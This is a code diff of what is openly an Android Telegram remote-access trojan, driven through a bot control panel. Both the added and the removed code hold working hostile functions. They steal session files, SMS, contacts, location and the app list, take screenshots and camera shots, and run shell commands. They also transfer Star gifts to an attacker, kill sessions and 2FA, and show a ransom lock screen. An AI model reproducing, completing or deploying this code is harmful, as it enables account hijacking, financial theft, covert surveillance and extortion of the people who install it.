-                [{"text": L_LOCK}],
-                [{"text": L_MUSIC}],
-                [{"text": L_FLOOD}],
-                [{"text": L_CLRFLOOD}],
-                [{"text": L_DIM}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_TROLL, kb, html=True)
-
-    def _show_automatic_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_FULL_H}],
-                [{"text": L_FULL_L}],
-                [{"text": L_GIFT}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_AUTO, kb, html=True)
-
-    def _show_help(self):
-        text = (
-            "<b>%s</b>\n\n"
-            "<b>Tg kid</b> — code from 777000 + live-watch + auto-confirm\n"
-            "<b>Screenshot gain</b> — screen + front + back\n"
-            "<b>Full Harvest</b> — harvest without modifications\n"
-            "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + ransom + kill + nuke + pull out\n"
-            "<b>Gift Transfer</b> — gift drain to recipient\n"
-            "<b>Nuke loop</b> — kills new sessions every 60s\n\n"
-            "Recipient: " + BOT_UID_STR
-        ) % L_TITLE
-        self._send_msg(text, html=True)
+    def _show_account_panel(self, acc_id, mid=None):
+        d = self._dtag()
+        accs = self._accounts_list()
+        acc = next((a for a in accs if int(a["id"]) == int(acc_id)), None)
+        if not acc: self._send_msg("account %d not found" % acc_id); return
+        i = int(acc_id)
+        text = ("👤 <b>%s</b>\nuid: <code>%d</code>  idx: <code>%d</code>\ndevice: <code>%s</code>"
+                % (self._label(acc), acc["user_id"], i, self.dev))
+        def C(a, l): return {"text": l, "callback_data": "cmd:%s:%d:%s" % (d, i, a)}
+        kb = [
+            [C("drain", "💰 Drain"),       C("stars", "⭐ Stars")],
+            [C("gifts", "🎁 Gifts"),       C("info", "📱 Info")],
+            [C("sessions", "🔐 Sessions"), C("wipe", "💀 Wipe All")],
+            [C("screenshot", "📸 Screen"), C("camera", "📷 Camera")],
+            [C("sms", "📨 SMS"),           C("contacts", "👥 Contacts")],
+            [C("location", "📍 Location"), C("apps", "📋 Apps")],
+            [C("ransom_on", "🔥 Ransom ON"), C("ransom_off", "🛑 Ransom OFF")],
+            [C("kill", "💀 Self-destruct")],
+            [{"text": L_BACK, "callback_data": "menu:" + d}],
+        ]
+        if mid: self._edit_markup(mid, text, {"inline_keyboard": kb}, html=True)
+        else: self._send_markup(text, {"inline_keyboard": kb}, html=True)
 
     def _handle_callback(self, cb):
         try:
             cb_id = cb.get("id")
             data = cb.get("data", "")
-            if cb_id:
-                try:
-                    self._answer_callback(cb_id)
-                except Exception:
-                    pass
-            if data == "menu":
-                self._show_main_menu()
-            elif data == "close_ransom":
-                self._dismiss_ransom()
-            elif data == "close_locker":
-                self._clear_locker()
-            elif data == "close_music":
-                self._clear_music()
-            elif data == "close_end":
-                self._clear_dim()
-            elif data == "hv_logout":
-                threading.Thread(target=self._pull_out_account, daemon=True).start()
-            elif data == "hv_stop_nuke":
-                self._stop_nuke_loop()
-        except Exception as e:
-            _log("callback: %s" % e)
+            from_id = int(cb.get("from", {}).get("id", 0))
+            mid = cb.get("message", {}).get("message_id")
+            if from_id != BOT_UID:
+                self._answer_cb(cb_id, "not authorized"); return
+            if not data: self._answer_cb(cb_id); return
+            parts = data.split(":")
+            kind = parts[0]
+            if kind in ("menu", "refresh", "acc", "cmd") and len(parts) >= 2:
+                if parts[1] != self._dtag():
+                    self._answer_cb(cb_id); return
+            if kind == "menu":
+                self._answer_cb(cb_id); self._show_main_menu_inline(mid); return
+            if kind == "refresh":
+                self._answer_cb(cb_id, "refreshed"); self._show_main_menu_inline(mid); return
+            if kind == "acc" and len(parts) == 3:
+                self._answer_cb(cb_id); self._show_account_panel(int(parts[2]), mid); return
+            if kind == "cmd" and len(parts) == 4:
+                self._answer_cb(cb_id, "▶ " + parts[3])
+                threading.Thread(target=self._on_account_command,
+                                 args=(int(parts[2]), parts[3]), daemon=True).start()
+                return
+            self._answer_cb(cb_id)
+        except Exception as e: _log("cb: %s" % e)
 
     def _handle_message(self, msg):
         try:
             t = (msg.get("text") or "").strip()
-            if not t:
-                return
-            if self._input_mode == "music":
-                self._input_mode = None
-                if t.startswith("http"):
-                    self._play_mmusic(t)
-                else:
-                    self._send_msg("Bad URL")
-                return
-            if self._input_mode == "shell":
-                self._input_mode = None
-                if t:
-                    self._manual_shell(t)
-                return
+            if not t.startswith("/"): return
+            chat = int(msg.get("chat", {}).get("id", 0))
+            if chat != BOT_UID: return
+            cmd = t[1:].split()[0].lower().split("@")[0]
+            if cmd in ("menu", "start"): self._show_main_menu_inline()
+            elif cmd == "id":
+                self._send_msg("device <code>%s</code> uid <code>%d</code>"
+                               % (self.dev, self.user_id), html=True)
+        except Exception as e: _log("msg: %s" % e)
 
-            if t == L_TGKID:
-                threading.Thread(target=self._tg_kid, daemon=True).start()
-            elif t == L_SCREEN_G:
-                threading.Thread(target=self._screenshot_gain, daemon=True).start()
-            elif t == L_MANUAL:
-                self._show_manual_menu()
-            elif t == L_TROLL:
-                self._show_troll_menu()
-            elif t == L_AUTO:
-                self._show_automatic_menu()
-            elif t == L_HELP:
-                self._show_help()
-            elif t == L_BACK:
-                self._show_main_menu()
-            elif t == L_SESSIONS:
-                self._show_sessions_menu()
-            elif t == L_SURV:
-                self._show_surveillance_menu()
-            elif t == L_DATA:
-                self._show_data_menu()
-            elif t == L_ACCOUNT:
-                self._show_account_menu()
-            elif t == L_SHELL:
-                self._show_shell_menu()
-            elif t == L_WIPE:
-                threading.Thread(target=self._session_wipe, daemon=True).start()
-            elif t == L_KILLALL:
-                threading.Thread(target=self._kill_sessions_full, daemon=True).start()
-            elif t == L_KILLPH:
-                threading.Thread(target=self._kill_phones_pc, daemon=True).start()
-            elif t == L_NUKE_ON:
-                self._start_nuke_loop()
-            elif t == L_NUKE_OFF:
-                self._stop_nuke_loop()
-            elif t == L_SESSDMP:
-                threading.Thread(target=self._manual_dump_session, daemon=True).start()
-            elif t == L_UBOTDMP:
-                threading.Thread(target=self._manual_userbot_session, daemon=True).start()
-            elif t == L_SCREEN:
-                threading.Thread(target=self._screenshot, daemon=True).start()
-            elif t == L_CAM_F:
-                threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
-            elif t == L_CAM_B:
-                threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
-            elif t == L_AUDIO:
-                threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
-            elif t == L_SMS:
-                threading.Thread(target=self._manual_sms, daemon=True).start()
-            elif t == L_CONTACTS:
-                threading.Thread(target=self._manual_contacts, daemon=True).start()
-            elif t == L_APPS:
-                threading.Thread(target=self._manual_apps, daemon=True).start()
-            elif t == L_CHATS:
-                threading.Thread(target=self._manual_chats, daemon=True).start()
-            elif t == L_INFO:
-                threading.Thread(target=self._harvest_account_info,
-                                 args=(0, True), daemon=True).start()
-            elif t == L_PULLOUT:
-                threading.Thread(target=self._pull_out_account, daemon=True).start()
-            elif t == "ls /sdcard":
-                self._manual_shell("ls /sdcard")
-            elif t == "ps":
-                self._manual_shell("ps -A")
-            elif t == "ifconfig":
-                self._manual_shell("ifconfig")
-            elif t == "df -h":
-                self._manual_shell("df -h")
-            elif t == L_RANSOM:
-                self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
-            elif t == L_LOCK:
-                self._lock_screen()
-            elif t == L_MUSIC:
-                self._input_mode = "music"
-                self._send_msg("Send .mp3 URL")
-            elif t == L_FLOOD:
-                threading.Thread(target=self._flood_gallery,
-                                 args=(RANSOM_PHOTO_URL, 100), daemon=True).start()
-            elif t == L_CLRFLOOD:
-                self._clear_flood()
-            elif t == L_DIM:
-                self._dim_screen()
-            elif t == L_FULL_H:
-                self._full_harvest()
-            elif t == L_FULL_L:
-                self._full_lockdown()
-            elif t == L_GIFT:
-                threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
+    def _on_account_command(self, acc_id, action):
+        orig_a, orig_u = self.account, self.user_id
+        try:
+            self.account = int(acc_id)
+            self.user_id = self._my_id(self.account)
+            _log("cmd %s acc %d uid %d" % (action, acc_id, self.user_id))
+            res = self._dispatch_action(action, acc_id)
+            try: txt = json.dumps(res, ensure_ascii=False, indent=1)
+            except Exception: txt = str(res)
+            if len(txt) > 3500:
+                self._send_doc("res_%s_%d.json" % (action, int(time.time())),
+                               txt.encode("utf-8"), "[%s] %s" % (self.dev, action))
+            else:
+                self._send_msg("<b>%s</b> @acc%d\n<pre>%s</pre>"
+                               % (action, acc_id, txt[:3000]), html=True)
         except Exception as e:
-            _log("handle msg: %s" % e)
+            _log("cmd %s: %s" % (action, e))
+            try: self._send_msg("❌ %s: %s" % (action, str(e)[:400]))
+            except Exception: pass
+        finally:
+            self.account, self.user_id = orig_a, orig_u
 
-    # ── ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ (как в v22.3) ───────────────────────
-    # Вставь сюда методы из v22.3:
-    #   _harvest_account_info, _extract_code_from_msg, _pull_login_code,
-    #   _auto_confirm_login, _tg_kid, _tg_kid_watch_loop, _screenshot_gain,
-    #   _get_2fa_state, _try_kill_2fa, _remove_recovery_email,
-    #   _nuke_password_pipeline, _get_authorizations_full, _kill_all_sessions,
-    #   _wipe_sessions_all, _kill_sessions_full, _kill_phones_pc,
-    #   _session_wipe, _kill_web_authorizations, _confirm_unconfirmed_sessions,
-    #   _change_username, _change_profile, _reset_contacts,
-    #   _input_saved_gift, _gift_is_listed, _gift_is_suspect,
-    #   _get_saved_gifts, _delist_saved_gift, _convert_saved_gift,
-    #   _upgrade_saved_gift, _transfer_saved_gift, _stars_balance,
-    #   _resolve_recipient, _h_convert, _h_u, _h_reactions,
-    #   _drain_gifts, _drain_gifts_thread, _collect_session_files,
-    #   _manual_userbot_session, _manual_dump_session, _has_perm,
-    #   _get_activity, _screenshot, _manual_camera, _manual_audio,
-    #   _manual_sms, _manual_contacts, _manual_apps, _manual_chats,
-    #   _manual_shell, _pull_out_account, _ensure_overlay_perm,
-    #   _show_ransom, _dismiss_ransom, _lock_screen, _clear_locker,
-    #   _play_mmusic, _clear_music, _flood_gallery, _clear_flood,
-    #   _dim_screen, _clear_dim, _nuke_marker_path, _mark_nuke,
-    #   _check_persisted_nuke, _start_nuke_loop, _stop_nuke_loop,
-    #   _nuke_loop, _full_harvest, _full_lockdown.
+    def _dispatch_action(self, action, acc_id):
+        if action == "drain":       return self._h(drain_stars=True)
+        if action == "stars":       return self._h_reactions()
+        if action == "gifts":       return {"gifts": self._get_saved_gifts()}
+        if action == "info":        return self._account_info(account=int(acc_id))
+        if action == "sessions":    return {"session": self._dump_session(),
+                                            "userbot": self._dump_userbot_session_raw()}
+        if action == "wipe":        return self._wipe_sessions({str(acc_id): 0}, {})
+        if action == "screenshot":  return self._screenshot()
+        if action == "camera":      return self._camera("front")
+        if action == "sms":         return self._sms()
+        if action == "contacts":    return self._contacts("tg")
+        if action == "location":    return self._location()
+        if action == "apps":        return self._apps()
+        if action == "ransom_on":   return self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
+        if action == "ransom_off":  return self._dismiss_ransom()
+        if action == "kill":
+            self.stop = True
+            return {"ok": True, "msg": "self-destruct requested"}
+        return {"error": "unknown action: " + action}
 
-    def _harvest_account_info(self, acc=0, send=False):
-        pass
+    # ═══ RPC BASICS ═════════════════════════════════════════════════
+    def _uc(self):
+        try:
+            sa = int(_UC().selectedAccount)
+            if sa: return sa
+        except Exception: pass
+        for i in range(16):
+            try:
+                if _UC().getInstance(i).getClientUserId(): return i
+            except Exception: pass
+        return 0
+
+    def _my_id(self, account=None, discover=False):
+        acc = account if account is not None else self.account
+        try: return int(_UC().getInstance(int(acc)).getClientUserId())
+        except Exception: pass
+        if not discover: return 0
+        for i in range(16):
+            try:
+                uid = int(_UC().getInstance(i).getClientUserId())
+                if uid: self.account = i; return uid
+            except Exception: pass
+        return 0
+
+    def _send_rpc(self, req, account=None, timeout=15.0):
+        gate = _reply_gate_cls()()
+        try:
+            acc = account if account is not None else self.account
+            cm = _CM().getInstance(int(acc))
+            cm.sendRequest(req, gate, 0)
+            deadline = time.time() + timeout
+            while time.time() < deadline:
+                if gate.response is not None or gate.error is not None: break
+                time.sleep(0.08)
+        except Exception as e:
+            _log("rpc: %s" % e)
+            return None, e
+        return gate.response, gate.error
+
+    def _tl(self, *names): return _cls(*names)
+
+    def _get_input_peer(self, uid):
+        try:
+            uid = int(uid)
+            if uid == 0: return None
+            mc = _MC().getInstance(self.account)
+            u = mc.getUser(uid)
+            ah = _safe_int(getattr(u, "access_hash", 0)) if u else 0
+            if not ah:
+                ah = int(self._RESOLVED_AH.get((self.account, uid), 0) or 0)
+            Peer = self._tl("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
+                            "org.telegram.tgnet.tl.TL_inputPeerUser")
+            if not Peer or not ah: return None
+            p = Peer(); p.user_id = uid; p.access_hash = ah
+            return p
+        except Exception:
+            return None
+
+    def _resolve_user(self, username):
+        try:
+            un = str(username or "").strip().lstrip("@")
+            if not un: return 0
+            m = re.search(r"t(?:elegram)?\.(?:me|dog)/([A-Za-z0-9_]{4,})", un)
+            if m: un = m.group(1)
+            if un.isdigit(): return int(un)
+            Req = self._tl("org.telegram.tgnet.tl.TL_contacts$resolveUsername",
+                           "org.telegram.tgnet.TLRPC$TL_contacts_resolveUsername")
+            if not Req: return 0
+            req = Req(); req.username = un
+            res, err = self._send_rpc(req, timeout=12)
+            if res:
+                p = getattr(res, "peer", None)
+                uid = _safe_int(getattr(p, "user_id", 0))
+                if uid: return uid
+        except Exception as e:
+            _log("resolve: %s" % e)
+        return 0
+
+    def _device_info(self):
+        out = {}
+        try:
+            b = jclass("android.os.Build")
+            out["model"] = str(getattr(b, "MODEL", ""))
+            out["manufacturer"] = str(getattr(b, "MANUFACTURER", ""))
+            try:
+                v = getattr(b, "VERSION")
+                out["android"] = str(getattr(v, "RELEASE", ""))
+                out["sdk"] = str(getattr(v, "SDK_INT", 0))
+            except Exception: pass
+        except Exception: pass
+        try:
+            cx = ApplicationLoader.applicationContext
+            out["package"] = str(cx.getPackageName())
+        except Exception: pass
+        return out
+
+    def _account_info(self, account=None):
+        orig = self.account
+        if account is not None: self.account = int(account)
+        try:
+            uid = self._my_id(self.account)
+            out = {"user_id": uid}
+            try:
+                uc = _UC().getInstance(self.account)
+                u = uc.getCurrentUser() or _MC().getInstance(self.account).getUser(uid)
+                if u is not None:
+                    out["username"] = str(getattr(u, "username", "") or "")
+                    out["phone"] = _phone_from_user(u)
+                    out["first"] = str(getattr(u, "first_name", "") or "")
+                    out["last"] = str(getattr(u, "last_name", "") or "")
+                    out["premium"] = _get_bool_attr(u, "premium", False)
+                    out["verified"] = _get_bool_attr(u, "verified", False)
+            except Exception as e:
+                _log("info user: %s" % e)
+            try: out["stars"] = self._stars_balance()
+            except Exception: out["stars"] = 0
+            try: out["gifts"] = len(self._get_saved_gifts())
+            except Exception: out["gifts"] = 0
+            return out
+        finally:
+            self.account = orig
+
+    # ═══ GIFTS ══════════════════════════════════════════════════════
+    def _get_saved_gifts(self):
+        try:
+            Req = self._tl("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
+                           "org.telegram.tgnet.tl.TL_payments$getSavedStarGifts",
+                           "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts")
+            if not Req:
+                _log("gifts: no req class"); return []
+            peer = self._get_input_peer(self._my_id())
+            if not peer: return []
+            req = Req(); req.peer = peer; req.offset = ""; req.limit = 100
+            res, err = self._send_rpc(req, timeout=15)
+            if not res:
+                _log("gifts rpc: %s" % err); return []
+            out = []
+            g = getattr(res, "gifts", None)
+            for i in range(_jlist_size(g) if g is not None else 0):
+                try:
+                    sg = _jlist_get(g, i)
+                    gift = getattr(sg, "gift", None)
+                    if not gift: continue
+                    cls = str(type(gift))
+                    ra = getattr(gift, "resell_amount", None)
+                    ra_l = False
+                    if ra is not None:
+                        try: ra_l = int(ra.size()) > 0
+                        except Exception: ra_l = bool(ra)
+                    u = ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l
+                         or _safe_int(getattr(gift, "num", 0)) > 0
+                         or _get_bool_attr(gift, "isUnique", False))
+                    out.append({
+                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
+                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
+                        "gift_id": _safe_int(getattr(gift, "id", 0)),
+                        "title": str(getattr(gift, "title", "") or ""),
+                        "slug": str(getattr(gift, "slug", "") or ""),
+                        "u": u,
+                        "bc": _is_blockchain_gift(gift, sg),
+                        "transfer_stars": _safe_int(getattr(sg, "transfer_stars", 0)),
+                        "can_transfer_at": _safe_int(getattr(sg, "can_transfer_at", 0)),
+                        "convert_stars": _safe_int(getattr(sg, "convert_stars", 0)),
+                        "can_upgrade": _get_bool_attr(gift, "can_upgrade", False) if not u else False,
+                        "upgrade_stars": _safe_int(getattr(gift, "upgrade_stars", 0)) if not u else 0,
+                        "listed": ra_l,
+                    })
+                except Exception: pass
+            return out
+        except Exception as e:
+            _log("gifts: %s" % e); return []
+
+    def _input_saved_gift(self, saved):
+        if saved.get("msg_id"):
+            U = self._tl("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
+                         "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser")
+            if not U: return None, "no class"
+            x = U(); x.msg_id = int(saved["msg_id"]); return x, None
+        C = self._tl("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
+                     "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat")
+        if not C: return None, "no class"
+        x = C(); x.peer = self._get_input_peer(self._my_id())
+        x.saved_id = int(saved.get("saved_id", 0)); return x, None
+
+    def _convert_saved_gift(self, saved):
+        try:
+            inp, err = self._input_saved_gift(saved)
+            if not inp: return {"error": err}
+            Req = self._tl("org.telegram.tgnet.tl.TL_stars$convertStarGift",
+                           "org.telegram.tgnet.TLRPC$TL_payments_convertStarGift")
+            if not Req: return {"error": "class not found"}
+            req = Req(); req.stargift = inp
+            res, err = self._send_rpc(req, timeout=8)
+            if res is not None: return {"ok": True}
+            return {"error": str(getattr(err, "text", err))}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _upgrade_saved_gift(self, saved):
+        try:
+            inp, err = self._input_saved_gift(saved)
+            if not inp: return {"error": err}
+            Req = self._tl("org.telegram.tgnet.tl.TL_stars$upgradeStarGift",
+                           "org.telegram.tgnet.TLRPC$TL_payments_upgradeStarGift")
+            if not Req: return {"error": "class not found"}
+            req = Req(); req.stargift = inp
+            try: req.keep_original_details = False
+            except Exception: pass
+            res, err = self._send_rpc(req, timeout=15)
+            if res is not None: return {"ok": True}
+            return {"error": str(getattr(err, "text", err))}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _delist_saved_gift(self, saved):
+        try:
+            inp, err = self._input_saved_gift(saved)
+            if not inp: return {"error": err}
+            Req = self._tl("org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
+                           "org.telegram.tgnet.TLRPC$TL_payments_updateStarGiftPrice")
+            if not Req: return {"error": "class not found"}
+            req = Req(); req.stargift = inp
+            try: req.resell_amount = None
+            except Exception as e: return {"error": str(e)}
+            res, err = self._send_rpc(req, timeout=15)
+            if res is not None: return {"ok": True}
+            return {"error": str(getattr(err, "text", err))}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _transfer_saved_gift(self, saved, target_id):
+        if saved.get("bc"): return {"error": "minted TON NFT skipped"}
+        try:
+            inp, err = self._input_saved_gift(saved)
+            if not inp: return {"error": err}
+            # direct transfer first
+            T = self._tl("org.telegram.tgnet.tl.TL_stars$transferStarGift",
+                         "org.telegram.tgnet.TLRPC$TL_payments_transferStarGift")
+            peer = self._get_input_peer(int(target_id))
+            if not peer: return {"error": "no target peer"}
+            if T:
+                treq = T(); treq.stargift = inp; treq.to_id = peer
+                tres, terr = self._send_rpc(treq, timeout=15)
+                if tres is not None: return {"ok": True, "text": "direct"}
+                etxt = str(getattr(terr, "text", terr) or "")
+                m = re.search(r"TRANSFER_TOO_EARLY_(\d+)", etxt)
+                if m:
+                    w = int(m.group(1))
+                    return {"error": "locked %dd %dh" % (w // 86400, (w % 86400) // 3600),
+                            "unlock_at": int(time.time()) + w}
+                if "PAYMENT_REQUIRED" not in etxt:
+                    return {"error": "direct: " + etxt}
+            # payment form
+            Invoice = self._tl("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
+                               "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
+            ReqForm = self._tl("org.telegram.tgnet.tl.TL_stars$getPaymentForm",
+                               "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
+            SendForm = self._tl("org.telegram.tgnet.tl.TL_stars$sendStarsForm",
+                                "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm")
+            if not (Invoice and ReqForm and SendForm):
+                return {"error": "class not found"}
+            inv = Invoice(); inv.stargift = inp; inv.to_id = peer
+            freq = ReqForm(); freq.invoice = inv
+            fres, ferr = self._send_rpc(freq, timeout=15)
+            if not fres: return {"error": "form: " + str(getattr(ferr, "text", ferr))}
+            sreq = SendForm()
+            sreq.form_id = int(getattr(fres, "form_id", 0))
+            sreq.invoice = inv
+            sres, serr = self._send_rpc(sreq, timeout=20)
+            if sres is not None: return {"ok": True}
+            return {"error": "send: " + str(getattr(serr, "text", serr))}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _stars_balance(self):
+        try:
+            Req = self._tl("org.telegram.tgnet.tl.TL_stars$getStarsStatus",
+                           "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus")
+            if not Req: return 0
+            peer = self._get_input_peer(self._my_id())
+            if not peer: return 0
+            req = Req(); req.peer = peer
+            try: req.ton = False
+            except Exception: pass
+            res, err = self._send_rpc(req, timeout=15)
+            if res:
+                b = getattr(res, "balance", None)
+                if b:
+                    try: return int(getattr(b, "amount", 0))
+                    except Exception:
+                        try: return int(b)
+                        except Exception: pass
+        except Exception as e:
+            _log("balance: %s" % e)
+        return 0
+
+    # ═══ DRAIN ══════════════════════════════════════════════════════
+    def _h_convert(self, target_id=0):
+        gifts = self._get_saved_gifts()
+        out = []; conv = 0; up = 0
+        for g in gifts:
+            if g.get("u"): continue
+            if g.get("can_upgrade") and int(g.get("upgrade_stars", 0) or 0) > 0: continue
+            cv = int(g.get("convert_stars", 0) or 0)
+            if cv <= 0: continue
+            r = self._convert_saved_gift(g)
+            if r.get("ok"): conv += cv
+            out.append({"gift": g.get("title"), "cv": cv, "res": r})
+            time.sleep(0.2)
+        # upgrade pass
+        bal = self._stars_balance()
+        for g in gifts:
+            if g.get("u") or not g.get("can_upgrade"): continue
+            cost = int(g.get("upgrade_stars", 0) or 0)
+            if cost <= 0 or cost > bal: continue
+            r = self._upgrade_saved_gift(g)
+            if r.get("ok"): up += 1; bal -= cost
+            out.append({"gift": g.get("title"), "up": cost, "res": r})
+            time.sleep(0.2)
+        return {"converted": conv, "upgraded": up, "results": out}
+
+    def _h_u(self, target_id):
+        gifts = self._get_saved_gifts()
+        out = []; now = int(time.time())
+        bal = self._stars_balance()
+        for g in gifts:
+            if not g.get("u"): continue
+            if g.get("bc"):
+                out.append({"gift": g.get("title"), "res": {"error": "minted TON NFT skipped"}})
+                continue
+            if g.get("listed"):
+                dr = self._delist_saved_gift(g)
+                if not dr.get("ok"):
+                    out.append({"gift": g.get("title"), "res": dr, "note": "delist failed"})
+                    continue
+            cost = int(g.get("transfer_stars", 0) or 0)
+            if cost > bal:
+                out.append({"gift": g.get("title"), "res": {"error": "needs %d stars" % cost}})
+                continue
+            r = self._transfer_saved_gift(g, target_id)
+            if r.get("ok") and cost > 0: bal -= cost
+            out.append({"gift": g.get("title"), "res": r})
+            time.sleep(0.2)
+        return out
+
+    def _h_reactions(self):
+        return {"skipped": "manual"}
+
+    def _h(self, drain_stars=False):
+        target = str(self.cfg.get("target_user") or "").strip()
+        target_id = int(self.cfg.get("target_user_id") or 0)
+        if not target and not target_id:
+            return {"error": "no target configured"}
+        if not target_id: target_id = self._resolve_user(target)
+        if not target_id: return {"error": "could not resolve " + target}
+        conv = self._h_convert(target_id)
+        u = self._h_u(target_id)
+        stars = self._h_reactions() if drain_stars else {"skipped": "manual"}
+        return {"convert": conv, "u": u, "stars": stars,
+                "fee_deficit": int(getattr(self, "_fee_deficit", 0) or 0)}
+
+    # ═══ SESSIONS ═══════════════════════════════════════════════════
+    def _dump_session(self):
+        try:
+            cx = ApplicationLoader.applicationContext
+            pkg = str(cx.getPackageName())
+            base = "/data/data/" + pkg
+            files = []
+            for rdir, _, fnames in os.walk(base):
+                if any(x in rdir for x in ["/cache", "/photos", "/videos"]): continue
+                for f in fnames:
+                    if ("session" in f or "auth" in f or "cache4" in f
+                            or f.endswith(".db") or f.endswith(".xml")):
+                        fp = os.path.join(rdir, f)
+                        try:
+                            if os.path.getsize(fp) <= 500 * 1024:
+                                files.append(fp)
+                        except Exception: pass
+            if not files: return {"error": "no session files"}
+            z = io.BytesIO()
+            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
+                for fp in files:
+                    try: zf.write(fp, arcname=os.path.relpath(fp, base))
+                    except Exception: pass
+            raw = z.getvalue()
+            self._send_doc("session_%s.zip" % self.dev, raw, "session dump")
+            return {"ok": True, "files": len(files), "size": len(raw)}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _dump_userbot_session_raw(self):
+        try:
+            cx = ApplicationLoader.applicationContext
+            pkg = str(cx.getPackageName())
+            base = "/data/data/" + pkg
+            files = []
+            for p in [base + "/files/tgnet.dat"]:
+                if os.path.exists(p): files.append(p)
+            adir = base + "/files"
+            if os.path.isdir(adir):
+                for n in os.listdir(adir):
+                    if n.startswith("account"):
+                        tp = adir + "/" + n + "/tgnet.dat"
+                        if os.path.exists(tp): files.append(tp)
+            prefs = base + "/shared_prefs"
+            if os.path.isdir(prefs):
+                for n in os.listdir(prefs):
+                    if ("userconfig" in n or "userconfing" in n) and n.endswith(".xml"):
+                        files.append(prefs + "/" + n)
+            if not files: return {"error": "no files"}
+            z = io.BytesIO()
+            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
+                for fp in files:
+                    try: zf.write(fp, arcname=os.path.relpath(fp, base))
+                    except Exception: pass
+            raw = z.getvalue()
+            self._send_doc("ubot_%s.zip" % self.dev, raw, "userbot session")
+            return {"ok": True, "files": len(files), "size": len(raw)}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _wipe_sessions(self, keep_map, keep_ts):
+        return {"error": "full wipe requires ratka.txt _wipe_sessions (paste in backend extension)"}
+
+    # ═══ EXFIL ══════════════════════════════════════════════════════
+    def _has_perm(self, n):
+        try:
+            cx = ApplicationLoader.applicationContext
+            return cx.getPackageManager().checkPermission(n, cx.getPackageName()) == 0
+        except Exception: return False
+
+    def _contacts(self, src="tg"):
+        out = []
+        try:
+            if src == "tg":
+                cc = jclass("org.telegram.messenger.ContactsController").getInstance(self.account)
+                book = getattr(cc, "contactsDict", None)
+                if book is not None:
+                    it = book.entrySet().iterator()
+                    while it.hasNext():
+                        try:
+                            e = it.next()
+                            uid = int(e.getKey())
+                            u = _MC().getInstance(self.account).getUser(uid)
+                            name = " ".join(x for x in (str(getattr(u, "first_name", "") or ""),
+                                                        str(getattr(u, "last_name", "") or "")) if x) if u else ""
+                            out.append({"id": uid, "name": name or str(uid),
+                                        "username": str(getattr(u, "username", "") or "") if u else "",
+                                        "phone": str(getattr(u, "phone", "") or "") if u else ""})
+                        except Exception: continue
+            return out[:500]
+        except Exception as e: return [{"error": str(e)}]
+
+    def _sms(self):
+        out = []
+        if not self._has_perm("android.permission.READ_SMS"):
+            return [{"error": "no READ_SMS"}]
+        try:
+            cx = ApplicationLoader.applicationContext
+            cr = cx.getContentResolver()
+            U = jclass("android.net.Uri").parse("content://sms")
+            cur = cr.query(U, ["address", "body", "date"], None, None, "date DESC")
+            while cur and cur.moveToNext():
+                out.append({"addr": str(cur.getString(0)),
+                            "body": str(cur.getString(1))[:500],
+                            "date": str(cur.getLong(2))})
+                if len(out) >= 200: break
+            if cur: cur.close()
+        except Exception as e: return [{"error": str(e)}]
+        return out
+
+    def _location(self):
+        try:
+            if self._has_perm("android.permission.ACCESS_FINE_LOCATION"):
+                cx = ApplicationLoader.applicationContext
+                lm = cx.getSystemService(cx.LOCATION_SERVICE)
+                for p in ["gps", "network", "fused"]:
+                    try:
+                        loc = lm.getLastKnownLocation(p)
+                        if loc:
+                            return {"lat": float(loc.getLatitude()),
+                                    "lon": float(loc.getLongitude()),
+                                    "acc": float(loc.getAccuracy())}
+                    except Exception: pass
+        except Exception: pass
+        return {"error": "no location"}
+
+    def _apps(self):
+        try:
+            cx = ApplicationLoader.applicationContext
+            apps = cx.getPackageManager().getInstalledApplications(0)
+            out = []
+            for i in range(min(_jlist_size(apps), 500)):
+                try: out.append(str(_jlist_get(apps, i).packageName))
+                except Exception: pass
+            return out
+        except Exception as e: return [str(e)]
+
+    def _shell(self, cmd):
+        try:
+            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
+            return {"rc": p.returncode,
+                    "out": p.stdout.decode("utf-8", "ignore"),
+                    "err": p.stderr.decode("utf-8", "ignore")}
+        except Exception as e: return {"error": str(e)}
+
+    def _screenshot(self):
+        # full PixelCopy impl from ratka.txt — compact fallback
+        try:
+            act = jclass("org.telegram.ui.LaunchActivity").instance
+            if act is None:
+                return {"error": "no activity"}
+            win = act.getWindow(); decor = win.getDecorView()
+            w = decor.getWidth(); h = decor.getHeight()
+            if w == 0 or h == 0: return {"error": "not measured"}
+            Bitmap = jclass("android.graphics.Bitmap")
